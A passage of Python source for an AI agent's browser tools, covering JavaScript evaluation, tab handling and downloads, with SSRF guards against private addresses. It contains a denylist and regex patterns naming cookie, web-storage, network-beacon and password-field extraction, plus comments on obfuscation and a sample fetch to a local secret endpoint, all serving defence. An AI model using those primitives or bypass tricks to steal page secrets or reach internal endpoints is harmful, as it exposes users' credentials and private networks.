    return json.dumps({
        "success": False,
        "error": (
            "Blocked: page URL targets a private or internal address "
            f"({blocked_url}). Refusing to {action} on this page in this "
            "browser mode."
        ),
    }, ensure_ascii=False)


def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
    """Get browser console messages and JavaScript errors, or evaluate JS in the page.

    When ``expression`` is provided, evaluates JavaScript in the page context
    (like the DevTools console) and returns the result.  Otherwise returns
    console output (log/warn/error/info) and uncaught exceptions.

    Args:
        clear: If True, clear the message/error buffers after reading
        expression: JavaScript expression to evaluate in the page context
        task_id: Task identifier for session isolation

    Returns:
        JSON string with console messages/errors, or eval result
    """
    # --- JS evaluation mode ---
    if expression is not None:
        policy_error = _enforce_browser_eval_policy(expression)
        if policy_error:
            return json.dumps({"success": False, "error": policy_error}, ensure_ascii=False)
        return _browser_eval(expression, task_id)

    # --- Console output mode (original behaviour) ---
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_console
        return camofox_console(clear, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    if _eval_ssrf_guard_active(effective_task_id):
        _blocked_url = _current_page_private_url(effective_task_id)
        if _blocked_url:
            return json.dumps({
                "success": False,
                "error": (
                    "Blocked: page URL targets a private or internal address "
                    f"({_blocked_url}). This may have been caused by a "
                    "JavaScript navigation via browser_console."
                ),
            }, ensure_ascii=False)

    console_args = ["--clear"] if clear else []
    error_args = ["--clear"] if clear else []

    console_result = _run_browser_command(effective_task_id, "console", console_args)
    errors_result = _run_browser_command(effective_task_id, "errors", error_args)

    messages = []
    if console_result.get("success"):
        for msg in console_result.get("data", {}).get("messages", []):
            messages.append({
                "type": msg.get("type", "log"),
                "text": _redact_browser_output(msg.get("text", "")),
                "source": "console",
            })

    errors = []
    if errors_result.get("success"):
        for err in errors_result.get("data", {}).get("errors", []):
            errors.append({
                "message": _redact_browser_output(err.get("message", "")),
                "source": "exception",
            })

    response = {
        "success": True,
        "console_messages": messages,
        "js_errors": errors,
        "total_messages": len(messages),
        "total_errors": len(errors),
    }
    _copy_fallback_warning(response, console_result)
    if errors_result.get("fallback_warning") and not response.get("fallback_warning"):
        _copy_fallback_warning(response, errors_result)
    return json.dumps(response, ensure_ascii=False)


def _eval_ssrf_guard_active(effective_task_id: str) -> bool:
    """Return True when eval-driven private-network access must be guarded.

    Matches the gating used by ``browser_navigate`` / ``browser_snapshot`` /
    ``browser_vision``: the SSRF guard is only meaningful for non-local
    backends (cloud browser, or a containerized terminal whose browser-on-host
    can reach internal networks the terminal can't), and is skipped for local
    sidecar sessions and when ``allow_private_urls`` is set.
    """
    return (
        not _is_local_backend()
        and not _is_local_sidecar_key(effective_task_id)
        and not _allow_private_urls()
    )


# URL-shaped literals embedded in a JS expression (http/https only).  Used to
# pre-screen ``browser_console(expression=...)`` calls that fetch/XHR/navigate
# to a private host directly — that path never updates ``location.href`` so the
# post-eval page-URL recheck below can't see it.
_JS_URL_LITERAL_RE = re.compile(r"""https?://[^\s'"`)\]<>]+""", re.IGNORECASE)


def _expression_targets_private_url(expression: str) -> Optional[str]:
    """Return the first private/always-blocked URL literal in a JS expression.

    Best-effort: scans for ``http(s)://...`` literals (fetch/XHR/navigation
    targets the agent may have embedded) and returns the first one that targets
    a private/internal address or the always-blocked cloud-metadata floor.
    Returns ``None`` when no such literal is found.
    """
    if not isinstance(expression, str):
        return None
    for match in _JS_URL_LITERAL_RE.findall(expression):
        candidate = match.rstrip(".,;")
        if _is_always_blocked_url(candidate) or not _is_safe_url(candidate):
            return candidate
    return None


def _current_page_private_url(effective_task_id: str) -> Optional[str]:
    """Return the current page URL when it targets a private/internal address.

    Reads ``window.location.href`` via a low-cost eval and returns it when the
    page has been navigated (e.g. via ``location.href = '...'`` in a prior
    eval) to an address the SSRF guard would reject.  Returns ``None`` when the
    page is public, the URL can't be determined, or the check errors (fail-open
    on probe failure, matching the snapshot/vision guards).
    """
    try:
        url_result = _run_browser_command(
            effective_task_id, "eval", ["window.location.href"],
            timeout=5, _engine_override="auto",
        )
        if url_result.get("success"):
            current_url = (
                url_result.get("data", {}).get("result", "")
                .strip().strip('"').strip("'")
            )
            if current_url and (
                _is_always_blocked_url(current_url) or not _is_safe_url(current_url)
            ):
                return current_url
    except Exception as exc:
        logger.debug("_current_page_private_url: probe failed (%s)", exc)
    return None


_RISKY_BROWSER_EVAL_PATTERNS: tuple[tuple[re.Pattern[str], str], ...] = (
    (re.compile(r"\bdocument\s*\.\s*cookie\b", re.I), "document.cookie"),
    (re.compile(r"\b(?:localStorage|sessionStorage)\b", re.I), "web storage"),
    (re.compile(r"\bindexedDB\b", re.I), "IndexedDB"),
    (re.compile(r"\bcaches\s*\.\s*(?:open|match|keys)\b", re.I), "Cache Storage"),
    (re.compile(r"\bnavigator\s*\.\s*(?:clipboard|credentials|serviceWorker)\b", re.I), "navigator sensitive API"),
    (re.compile(r"\b(?:fetch|XMLHttpRequest|WebSocket|EventSource)\s*\(", re.I), "network request"),
    (re.compile(r"\bnavigator\s*\.\s*sendBeacon\s*\(", re.I), "network beacon"),
    (re.compile(r"\bdocument\s*\.\s*forms\b.*\bvalue\b", re.I | re.S), "form value extraction"),
    (re.compile(r"\bquerySelector(?:All)?\s*\([^)]*(?:input|textarea|password)[^)]*\).*\bvalue\b", re.I | re.S), "form value extraction"),
)
_JS_STRING_LITERAL_RE = re.compile(
    r"""'(?:\\.|[^'\\])*'|\"(?:\\.|[^\"\\])*\"|`(?:\\.|[^`\\])*`""",
    re.S,
)
_SENSITIVE_BROWSER_EVAL_TOKENS: tuple[tuple[str, str], ...] = (
    ("cookie", "document.cookie"),
    ("localStorage", "web storage"),
    ("sessionStorage", "web storage"),
    ("indexedDB", "IndexedDB"),
    ("caches", "Cache Storage"),
    ("clipboard", "navigator sensitive API"),
    ("credentials", "navigator sensitive API"),
    ("serviceWorker", "navigator sensitive API"),
    ("fetch", "network request"),
    ("XMLHttpRequest", "network request"),
    ("WebSocket", "network request"),
    ("EventSource", "network request"),
    ("sendBeacon", "network beacon"),
)


def _allow_unsafe_browser_evaluate() -> bool:
    """Return whether sensitive browser JS evaluation is explicitly allowed.

    When true, ``browser_console(expression=...)`` runs without the
    sensitive-primitive denylist even if ``browser.restrict_evaluate`` is set.
    """
    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        return is_truthy_value(cfg_get(cfg, "browser", "allow_unsafe_evaluate"), default=False)
    except Exception as e:
        logger.debug("Could not read browser.allow_unsafe_evaluate from config: %s", e)
        return False


def _restrict_browser_evaluate() -> bool:
    """Return whether the sensitive-primitive eval denylist is enabled.

    Off by default. ``browser_console(expression=...)`` is the agent's only
    programmatic page-inspection path, and the denylist blocks the *names* of
    common primitives (``fetch``, ``cookie``, ``querySelector(...input...)``)
    rather than any actual exfiltration — which also blocks a large class of
    legitimate DOM extraction (any selector or page script text containing
    those words). Egress itself is still gated by the SSRF/private-URL guards
    in ``_browser_eval`` regardless of this setting. Users who want the
    strict vocabulary denylist (e.g. when browsing hostile pages with a
    logged-in profile) opt in with ``browser.restrict_evaluate: true``;
    ``browser.allow_unsafe_evaluate: true`` overrides it back off.
    """
    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        return is_truthy_value(cfg_get(cfg, "browser", "restrict_evaluate"), default=False)
    except Exception as e:
        logger.debug("Could not read browser.restrict_evaluate from config: %s", e)
        return False


def _decode_js_string_literal(literal: str) -> str:
    """Best-effort decode of a JavaScript string literal for policy checks.

    This is not a JS parser.  It only normalizes common escaped property names
    such as ``document["co\\x6fkie"]`` before the fail-closed sensitive-token
    check below.
    """
    if len(literal) < 2:
        return literal
    body = literal[1:-1]
    try:
        return bytes(body, "utf-8").decode("unicode_escape")
    except Exception:
        return body


def _decoded_js_string_literals(expression: str) -> list[str]:
    return [_decode_js_string_literal(match.group(0)) for match in _JS_STRING_LITERAL_RE.finditer(expression)]


def _sensitive_browser_eval_token_reason(expression: str) -> Optional[str]:
    """Return a risk reason for direct or quoted sensitive browser primitives.

    ``browser_console(expression=...)`` executes in the page origin.  A denylist
    that only searches direct spellings like ``document.cookie`` and ``fetch(``
    misses equivalent JavaScript property access such as ``document["cookie"]``
    or ``globalThis["fetch"](...)``.  Treat sensitive primitive names as risky
    whether they appear as identifiers or decoded string-literal property names.
    Concatenating all string literals catches simple obfuscations like
    ``document["coo" + "kie"]`` while the config opt-in preserves the escape
    hatch for trusted pages.
    """
    string_literals = _decoded_js_string_literals(expression)
    concatenated_literals = "".join(string_literals).lower()
    for token, reason in _SENSITIVE_BROWSER_EVAL_TOKENS:
        if re.search(rf"\b{re.escape(token)}\b", expression, re.I):
            return reason
        token_lower = token.lower()
        if any(token_lower in literal.lower() for literal in string_literals):
            return reason
        if token_lower in concatenated_literals:
            return reason
    return None


def _risky_browser_eval_reason(expression: str) -> Optional[str]:
    """Return a human-readable reason if a JS expression uses risky primitives."""
    if not expression:
        return None
    for pattern, reason in _RISKY_BROWSER_EVAL_PATTERNS:
        if pattern.search(expression):
            return reason
    return _sensitive_browser_eval_token_reason(expression)


def _enforce_browser_eval_policy(expression: str) -> Optional[str]:
    """Block sensitive browser JS evaluation when the opt-in denylist is on.

    The denylist is opt-in (``browser.restrict_evaluate: true``) because it
    gates on primitive *names*, which cripples legitimate DOM extraction —
    see ``_restrict_browser_evaluate``. Network egress to private/internal
    addresses is enforced separately in ``_browser_eval`` and does not depend
    on this policy.
    """
    if not _restrict_browser_evaluate():
        return None
    if _allow_unsafe_browser_evaluate():
        return None
    reason = _risky_browser_eval_reason(expression)
    if not reason:
        return None
    return (
        "Blocked: browser_console(expression=...) tried to use sensitive browser "
        f"JavaScript primitive ({reason}) while browser.restrict_evaluate is "
        "enabled. Use browser_snapshot/browser_get_images/browser_console "
        "without expression for normal inspection, or set "
        "browser.restrict_evaluate: false in config.yaml to allow "
        "programmatic evaluation."
    )


def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
    """Evaluate a JavaScript expression in the page context and return the result."""
    effective_task_id = _last_session_key(task_id or "default")

    if _eval_ssrf_guard_active(effective_task_id):
        blocked_literal = _expression_targets_private_url(expression)
        if blocked_literal:
            return json.dumps({
                "success": False,
                "error": (
                    "Blocked: JavaScript expression targets a private or "
                    f"internal address ({blocked_literal}). Reading internal "
                    "endpoints via browser_console is not permitted in this "
                    "browser mode."
                ),
            }, ensure_ascii=False)

    # Camofox keeps its own raw-``task_id``-keyed session map, so pass the raw
    # id (matching every other Camofox tool) rather than the resolved
    # agent-browser session key.  The literal pre-scan above already ran.
    if _is_camofox_mode():
        return _camofox_eval(expression, task_id)

    # ── Private-network guard (eval return-value path) ──────────────────────
    # The literal pre-scan above closes the direct-fetch sub-path
    # (`fetch('http://127.0.0.1/secret')`).  The post-eval page-URL recheck
    # below closes the navigate-then-read sub-path (`location.href = '...'`
    # then read the DOM) — eval returns arbitrary JS results directly, never
    # touching snapshot/vision, so both sub-paths gate on the same condition.

    # --- Fast path: route through the supervisor's persistent CDP WS ---------
    # When a CDPSupervisor is alive for this task_id, ``Runtime.evaluate`` runs
    # on the already-connected WebSocket — zero subprocess startup cost vs
    # spawning an ``agent-browser eval`` CLI process.  Falls through to the
    # subprocess path on any error so behaviour is unchanged when no
    # supervisor is running (e.g. plain agent-browser without a CDP backend).
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
        supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
        if supervisor is not None:
            sup_result = supervisor.evaluate_runtime(expression)
            if sup_result.get("ok"):
                raw_result = sup_result.get("result")
                # Match the agent-browser path: if the value is a JSON string,
                # parse it so the model gets structured data.
                parsed = raw_result
                if isinstance(raw_result, str):
                    try:
                        parsed = json.loads(raw_result)
                    except (json.JSONDecodeError, ValueError):
                        pass  # keep as string
                # Post-eval page-URL recheck: if this (or a prior) eval
                # navigated the page to a private address, withhold the result.
                if _eval_ssrf_guard_active(effective_task_id):
                    _blocked_url = _current_page_private_url(effective_task_id)
                    if _blocked_url:
                        return json.dumps({
                            "success": False,
                            "error": (
                                "Blocked: page URL targets a private or internal "
                                f"address ({_blocked_url}). This may have been "
                                "caused by a JavaScript navigation via "
                                "browser_console."
                            ),
                        }, ensure_ascii=False)
                response = {
                    "success": True,
                    "result": _redact_browser_output(parsed),
                    "result_type": type(parsed).__name__,
                    "method": "cdp_supervisor",
                }
                return json.dumps(response, ensure_ascii=False, default=str)
            # JS exception is a real failure — surface it instead of falling
            # through to the subprocess path (which would just re-run and
            # produce the same exception, but slower).
            err = sup_result.get("error") or "evaluate_runtime failed"
            if "supervisor" not in err.lower():
                # Real JS-side error — return it.
                return json.dumps({"success": False, "error": err}, ensure_ascii=False)
            # Supervisor-side failure (loop down, no session) — fall through.
            logger.debug(
                "browser_eval: supervisor path unavailable (%s), falling back to subprocess",
                err,
            )
    except ImportError:
        pass
    except Exception as exc:  # pragma: no cover — defensive
        logger.debug("browser_eval: supervisor path errored (%s), falling back", exc)

    # --- Fallback: agent-browser CLI subprocess (original path) -------------
    result = _run_browser_command(effective_task_id, "eval", [expression])

    if not result.get("success"):
        err = result.get("error", "eval failed")
        # Detect backend capability gaps and give the model a clear signal
        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
            response = {
                "success": False,
                "error": f"JavaScript evaluation is not supported by this browser backend. {err}",
            }
            return json.dumps(_copy_fallback_warning(response, result))
        # A live DOM node / NodeList / Window can't be JSON-serialized by CDP
        # and fails the eval with "Object reference chain is too long".  The
        # supervisor fast path retries with returnByValue=false, but the CLI
        # subprocess can't, so turn the cryptic protocol error into actionable
        # guidance instead of surfacing it raw.
        if "reference chain is too long" in err.lower():
            response = {
                "success": False,
                "error": (
                    "Expression returned a live DOM node / NodeList / Window, "
                    "which can't be serialized. Extract a primitive value "
                    "(e.g. .innerText, .href, .src, .value) or use "
                    "JSON.stringify() / a snapshot tool instead."
                ),
            }
            return json.dumps(_copy_fallback_warning(response, result))
        response = {
            "success": False,
            "error": err,
        }
        return json.dumps(_copy_fallback_warning(response, result))

    data = result.get("data", {})
    raw_result = data.get("result")

    # The eval command returns the JS result as a string.  If the string
    # is valid JSON, parse it so the model gets structured data.
    parsed = raw_result
    if isinstance(raw_result, str):
        try:
            parsed = json.loads(raw_result)
        except (json.JSONDecodeError, ValueError):
            pass  # keep as string

    response = {
        "success": True,
        "result": _redact_browser_output(parsed),
        "result_type": type(parsed).__name__,
    }
    # Post-eval page-URL recheck: if this (or a prior) eval navigated the page
    # to a private address, withhold the result (mirrors the supervisor path).
    if _eval_ssrf_guard_active(effective_task_id):
        _blocked_url = _current_page_private_url(effective_task_id)
        if _blocked_url:
            return json.dumps({
                "success": False,
                "error": (
                    "Blocked: page URL targets a private or internal address "
                    f"({_blocked_url}). This may have been caused by a "
                    "JavaScript navigation via browser_console."
                ),
            }, ensure_ascii=False)
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False, default=str)


def _camofox_current_page_private_url(tab_id: str, user_id: str) -> Optional[str]:
    """Return the Camofox page URL when it targets a private/internal address.

    Camofox analogue of ``_current_page_private_url`` (evaluate endpoint instead
    of the agent-browser CLI).  Returns ``None`` when the page is public, the URL
    can't be determined, or the probe errors (fail-open on probe failure,
    matching the snapshot/vision guards — do not change to fail-closed without
    also changing the sibling).
    """
    try:
        from tools.browser_camofox import _post

        data = _post(
            f"/tabs/{tab_id}/evaluate",
            body={"expression": "window.location.href", "userId": user_id},
        )
        current_url = str(data.get("result") if isinstance(data, dict) else data or "")
        current_url = current_url.strip().strip('"').strip("'")
        if current_url and (_is_always_blocked_url(current_url) or not _is_safe_url(current_url)):
            return current_url
    except Exception as exc:
        logger.debug("_camofox_current_page_private_url: probe failed (%s)", exc)
    return None


def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
    """Evaluate JS via Camofox's /tabs/{tab_id}/evaluate endpoint (if available)."""
    from tools.browser_camofox import _ensure_tab, _post
    try:
        tab_info = _ensure_tab(task_id or "default")
        tab_id = tab_info.get("tab_id") or tab_info.get("id")
        user_id = tab_info["user_id"]
        resp = _post(f"/tabs/{tab_id}/evaluate", body={"expression": expression, "userId": user_id})

        # Camofox returns the result in a JSON envelope
        raw_result = resp.get("result") if isinstance(resp, dict) else resp
        parsed = raw_result
        if isinstance(raw_result, str):
            try:
                parsed = json.loads(raw_result)
            except (json.JSONDecodeError, ValueError):
                pass

        if _eval_ssrf_guard_active(task_id or "default"):
            _blocked_url = _camofox_current_page_private_url(tab_id, user_id)
            if _blocked_url:
                return json.dumps({
                    "success": False,
                    "error": (
                        "Blocked: page URL targets a private or internal address "
                        f"({_blocked_url}). This may have been caused by a "
                        "JavaScript navigation via browser_console."
                    ),
                }, ensure_ascii=False)

        return json.dumps({
            "success": True,
            "result": _redact_browser_output(parsed),
            "result_type": type(parsed).__name__,
        }, ensure_ascii=False, default=str)
    except Exception as e:
        error_msg = str(e)
        # Graceful degradation — server may not support eval
        if any(code in error_msg for code in ("404", "405", "501")):
            return json.dumps({
                "success": False,
                "error": "JavaScript evaluation is not supported by this Camofox server. "
                         "Use browser_snapshot or browser_vision to inspect page state.",
            })
        return tool_error(error_msg, success=False)


def _browser_tool_unsupported_in_camofox(tool_name: str) -> str:
    """Return a consistent unsupported error for tools missing on Camofox."""
    return json.dumps({
        "success": False,
        "error": (
            f"{tool_name} is not supported by the configured Camofox browser backend. "
            "Use the standard agent-browser backend or a CDP-connected browser for this operation."
        ),
    }, ensure_ascii=False)


def _normalize_ref(ref: str) -> str:
    """Ensure browser refs use the @eN form expected by the browser backends."""
    return ref if ref.startswith("@") else f"@{ref}"


def _normalize_upload_target(target: str) -> str:
    """Accept either an @eN ref or a raw selector for browser_upload."""
    stripped = (target or "").strip()
    if not stripped:
        return stripped
    if stripped.startswith("@"):
        return stripped
    if re.fullmatch(r"e\d+", stripped):
        return f"@{stripped}"
    return stripped


def _normalize_upload_paths(path: Optional[str] = None, paths: Optional[List[str]] = None) -> tuple[list[str], Optional[str]]:
    """Validate and normalize upload file paths."""
    raw_paths: list[str] = []
    if path:
        raw_paths.append(path)
    if paths:
        raw_paths.extend(paths)

    if not raw_paths:
        return [], "No files provided. Pass 'path' or 'paths'."

    normalized: list[str] = []
    seen: set[str] = set()
    for raw in raw_paths:
        if not isinstance(raw, str) or not raw.strip():
            return [], "Invalid file path: empty path entries are not allowed."
        candidate = str(Path(raw).expanduser().resolve())
        if not os.path.exists(candidate):
            return [], f"Upload file not found: {candidate}"
        if not os.path.isfile(candidate):
            return [], f"Upload path is not a file: {candidate}"
        if candidate in seen:
            continue
        seen.add(candidate)
        normalized.append(candidate)

    if not normalized:
        return [], "No valid files provided for upload."
    return normalized, None


def _default_browser_download_path() -> Path:
    """Return a persistent default file path for browser downloads."""
    import uuid

    downloads_dir = get_hermes_home() / "browser_downloads"
    downloads_dir.mkdir(parents=True, exist_ok=True)
    return downloads_dir / f"download_{int(time.time())}_{uuid.uuid4().hex[:8]}.bin"


def _normalize_download_path(path: Optional[str]) -> Path:
    """Resolve an explicit or default download destination to an absolute path."""
    target = Path(path).expanduser() if path else _default_browser_download_path()
    if not target.is_absolute():
        target = Path.cwd() / target
    target = target.resolve()
    target.parent.mkdir(parents=True, exist_ok=True)
    return target


def _normalize_tab_payload(data: Any) -> tuple[list[dict[str, Any]], Optional[int]]:
    """Normalize browser tab listings to a stable Hermes shape."""
    active_index: Optional[int] = None
    raw_tabs: Any = data
    if isinstance(data, dict):
        raw_tabs = data.get("tabs")
        if raw_tabs is None:
            for key in ("data", "items", "list"):
                if isinstance(data.get(key), list):
                    raw_tabs = data[key]
                    break
        active_index = data.get("active_index") or data.get("activeIndex")

    if not isinstance(raw_tabs, list):
        raw_tabs = []

    tabs: list[dict[str, Any]] = []
    for pos, item in enumerate(raw_tabs, start=1):
        if isinstance(item, dict):
            entry = {
                "index": pos,
                "title": item.get("title") or item.get("name") or "",
                "url": item.get("url") or item.get("href") or "",
                "active": bool(item.get("active") or item.get("current") or item.get("selected")),
            }
        else:
            entry = {
                "index": pos,
                "title": str(item),
                "url": "",
                "active": False,
            }
        tabs.append(entry)
        if entry["active"]:
            active_index = entry["index"]

    if active_index is None:
        for entry in tabs:
            if entry["active"]:
                active_index = entry["index"]
                break

    if active_index is not None:
        try:
            active_index = int(active_index)
        except (TypeError, ValueError):
            active_index = None

    return tabs, active_index


# URLs that render an empty accessibility tree — a tab sitting on one is "blank".
def _looks_blank_url(url: str) -> bool:
    u = (url or "").strip().lower().rstrip("/")
    if not u:
        return True
    return (
        u in ("about:blank", "about:newtab")
        or u.startswith("chrome://new-tab-page")
        or u.startswith("chrome://newtab")
        or u.startswith("edge://newtab")
    )


def _blank_tab_recovery_hint(effective_task_id: str) -> Optional[dict]:
    """Steer hint for the empty-snapshot failure mode.

    agent-browser auto-activates the newest tab, so a spurious about:blank /
    new-tab popup — common on login / 2FA flows — steals focus and leaves
    ``browser_snapshot`` empty. When the active tab is blank but another tab
    still holds real content, return a hint so the agent switches back with
    ``browser_tab`` instead of flailing on the empty page. Best-effort and
    purely additive: never forces a switch, returns None when not applicable
    (e.g. the page is legitimately blank with no other content tab). See the
    agent-browser migration notes (blank-tab fix, 2026-07-19)."""
    try:
        result = _run_browser_command(effective_task_id, "tab", ["list"], timeout=8)
        if not result.get("success"):
            return None
        tabs, _active_index = _normalize_tab_payload(result.get("data", {}))
        if len(tabs) < 2:
            return None
        active = next((t for t in tabs if t.get("active")), None)
        if active is None or not _looks_blank_url(active.get("url", "")):
            return None
        content = [
            t for t in tabs
            if not t.get("active") and not _looks_blank_url(t.get("url", ""))
        ]
        if not content:
            return None
        return {
            "reason": "active_tab_blank",
            "message": (
                "The active tab is blank — a new/popup tab stole focus. "
                f"{len(content)} other tab(s) hold real content. Call "
                "browser_tab(action='switch', index=N) to return to the page, "
                "then re-snapshot."
            ),
            "other_tabs": [
                {"index": t["index"], "title": t.get("title", ""), "url": t.get("url", "")}
                for t in content
            ],
        }
    except Exception as exc:  # never let the steer break a snapshot
        logger.debug("blank-tab recovery hint failed: %s", exc)
        return None


def _camofox_tab_list(task_id: Optional[str]) -> tuple[list[dict[str, Any]], Optional[int], dict[str, Any]]:
    """Return normalized Camofox tabs plus active index and session info."""
    from tools.browser_camofox import _get, _get_session

    session = _get_session(task_id or "default")
    data = _get("/tabs", params={"userId": session["user_id"]})
    raw_tabs = data.get("tabs", []) if isinstance(data, dict) else []

    tabs: list[dict[str, Any]] = []
    active_index: Optional[int] = None
    active_tab_id = session.get("tab_id")
    for pos, item in enumerate(raw_tabs, start=1):
        tab_id = item.get("tabId") if isinstance(item, dict) else None
        is_active = bool(active_tab_id and tab_id == active_tab_id)
        tabs.append({
            "index": pos,
            "title": item.get("title", "") if isinstance(item, dict) else str(item),
            "url": item.get("url", "") if isinstance(item, dict) else "",
            "active": is_active,
            "tab_id": tab_id,
        })
        if is_active:
            active_index = pos

    return tabs, active_index, session


def _default_browser_download_dir() -> Path:
    downloads_dir = get_hermes_home() / "browser_downloads"
    downloads_dir.mkdir(parents=True, exist_ok=True)
    return downloads_dir


def _choose_download_target(path: Optional[str], suggested_filename: Optional[str] = None) -> Path:
    if path:
        return _normalize_download_path(path)
    filename = (suggested_filename or "download.bin").strip() or "download.bin"
    filename = filename.replace("/", "_").replace("\\", "_")
    target = _default_browser_download_dir() / filename
    if not target.exists():
        return target.resolve()
    stem = target.stem
    suffix = target.suffix
    for i in range(1, 1000):
        candidate = target.with_name(f"{stem}_{i}{suffix}")
        if not candidate.exists():
            return candidate.resolve()
    return _normalize_download_path(None)


def _camofox_browser_tab(action: str, index: Optional[int], url: Optional[str], task_id: Optional[str]) -> str:
    from tools.browser_camofox import _delete, _get_session, _post

    validated_index = int(index) if index is not None else None
    if action == "list":
        tabs, active_index, _session = _camofox_tab_list(task_id)
        for tab in tabs:
            tab.pop("tab_id", None)
        return json.dumps({"success": True, "tabs": tabs, "active_index": active_index}, ensure_ascii=False)

    session = _get_session(task_id or "default")

    if action == "new":
        data = _post(
            "/tabs",
            {
                "userId": session["user_id"],
                "sessionKey": session["session_key"],
                "url": url or "about:blank",
            },
            timeout=max(_get_command_timeout(), 60),
        )
        if isinstance(data, dict) and data.get("tabId"):
            session["tab_id"] = data["tabId"]
        response = {"success": True, "action": "new"}
        if url:
            response["url"] = url
        return json.dumps(response, ensure_ascii=False)

    tabs, active_index, session = _camofox_tab_list(task_id)
    if action == "switch":
        if validated_index is None or validated_index < 1 or validated_index > len(tabs):
            return json.dumps({"success": False, "error": "Tab index out of range."}, ensure_ascii=False)
        session["tab_id"] = tabs[validated_index - 1].get("tab_id")
        return json.dumps({"success": True, "action": "switch", "active_index": validated_index}, ensure_ascii=False)

    target_tab = None
    if validated_index is not None:
        if validated_index < 1 or validated_index > len(tabs):
            return json.dumps({"success": False, "error": "Tab index out of range."}, ensure_ascii=False)
        target_tab = tabs[validated_index - 1]
    else:
        target_tab = next((tab for tab in tabs if tab.get("active")), tabs[-1] if tabs else None)

    if not target_tab or not target_tab.get("tab_id"):
        return json.dumps({"success": False, "error": "No tab available to close."}, ensure_ascii=False)

    _delete(f"/tabs/{target_tab['tab_id']}", body={"userId": session["user_id"]}, timeout=max(_get_command_timeout(), 60))
    remaining_tabs, remaining_active_index, session = _camofox_tab_list(task_id)
    if session.get("tab_id") == target_tab.get("tab_id"):
        session["tab_id"] = remaining_tabs[-1].get("tab_id") if remaining_tabs else None
        for pos, item in enumerate(remaining_tabs, start=1):
            item["active"] = item.get("tab_id") == session.get("tab_id")
            if item["active"]:
                remaining_active_index = pos

    response = {"success": True, "action": "close"}
    if validated_index is not None:
        response["closed_index"] = validated_index
    else:
        response["closed_active"] = True
    response["active_index"] = remaining_active_index
    return json.dumps(response, ensure_ascii=False)


def _camofox_browser_download(ref: str, path: Optional[str], task_id: Optional[str]) -> str:
    import base64
    from tools.browser_camofox import _ensure_tab, _get, _post

    session = _ensure_tab(task_id or "default")
    tab_id = session.get("tab_id")
    normalized_ref = _normalize_ref(ref).lstrip("@")

    _post(
        f"/tabs/{tab_id}/click",
        {"userId": session["user_id"], "ref": normalized_ref},
        timeout=max(_get_command_timeout(), 60),
    )

    deadline = time.time() + 20
    last_downloads: list[dict[str, Any]] = []
    while time.time() < deadline:
        data = _get(
            f"/tabs/{tab_id}/downloads",
            params={"userId": session["user_id"], "includeData": "true", "consume": "true"},
            timeout=max(_get_command_timeout(), 60),
        )
        last_downloads = data.get("downloads", []) if isinstance(data, dict) else []
        if last_downloads:
            break
        time.sleep(0.5)

    if not last_downloads:
        return json.dumps({"success": False, "error": "No download was captured after clicking the target element."}, ensure_ascii=False)

    first = last_downloads[0]
    if first.get("failure"):
        return json.dumps({"success": False, "error": f"Download failed: {first['failure']}"}, ensure_ascii=False)
    raw_b64 = first.get("dataBase64")
    if not raw_b64:
        return json.dumps({
            "success": False,
            "error": "Download metadata was captured, but file bytes were unavailable from Camofox.",
            "downloads": last_downloads,
        }, ensure_ascii=False)

    target_path = _choose_download_target(path, first.get("suggestedFilename"))
    target_path.parent.mkdir(parents=True, exist_ok=True)
    target_path.write_bytes(base64.b64decode(raw_b64))
    return json.dumps({
        "success": True,
        "path": str(target_path),
        "exists": True,
        "element": _normalize_ref(ref),
    }, ensure_ascii=False)


def browser_tab(action: str, index: Optional[int] = None, url: Optional[str] = None, task_id: Optional[str] = None) -> str:
    """Manage browser tabs using a single multiplexed tool."""
    if _is_camofox_mode():
        return _camofox_browser_tab(action=action, index=index, url=url, task_id=task_id)

    action = (action or "").strip().lower()
    if action not in {"new", "list", "switch", "close"}:
        return json.dumps({"success": False, "error": f"Invalid action '{action}'."}, ensure_ascii=False)

    validated_index: Optional[int] = None
    if index is not None:
        validated_index = int(index)
    if action == "switch" and (validated_index is None or validated_index < 1):
        return json.dumps({"success": False, "error": "browser_tab(action='switch') requires a 1-based index."}, ensure_ascii=False)
    if action == "close" and validated_index is not None and validated_index < 1:
        return json.dumps({"success": False, "error": "browser_tab(action='close') index must be >= 1."}, ensure_ascii=False)

    effective_task_id = _last_session_key(task_id or "default")

    if action == "list":
        result = _run_browser_command(effective_task_id, "tab", ["list"])
        if not result.get("success"):
            response = {"success": False, "error": result.get("error", "Failed to list tabs")}
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
        tabs, active_index = _normalize_tab_payload(result.get("data", {}))
        response = {"success": True, "tabs": tabs, "active_index": active_index}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    if action == "new":
        create_result = _run_browser_command(effective_task_id, "tab", ["new"])
        if not create_result.get("success"):
            response = {"success": False, "error": create_result.get("error", "Failed to create new tab")}
            return json.dumps(_copy_fallback_warning(response, create_result), ensure_ascii=False)
        if url:
            nav_result = _run_browser_command(effective_task_id, "open", [url], timeout=max(_get_command_timeout(), 60))
            if not nav_result.get("success"):
                response = {"success": False, "error": nav_result.get("error", f"Failed to navigate new tab to {url}")}
                return json.dumps(_copy_fallback_warning(response, nav_result), ensure_ascii=False)
            response = {"success": True, "action": "new", "url": url}
            return json.dumps(_copy_fallback_warning(response, nav_result), ensure_ascii=False)
        response = {"success": True, "action": "new"}
        return json.dumps(_copy_fallback_warning(response, create_result), ensure_ascii=False)

    if action == "switch":
        result = _run_browser_command(effective_task_id, "tab", [str(validated_index)])
        if not result.get("success"):
            response = {"success": False, "error": result.get("error", f"Failed to switch to tab {validated_index}")}
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
        response = {"success": True, "action": "switch", "active_index": validated_index}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    close_args = ["close"]
    if validated_index is not None:
        close_args.append(str(validated_index))
    result = _run_browser_command(effective_task_id, "tab", close_args)
    if not result.get("success"):
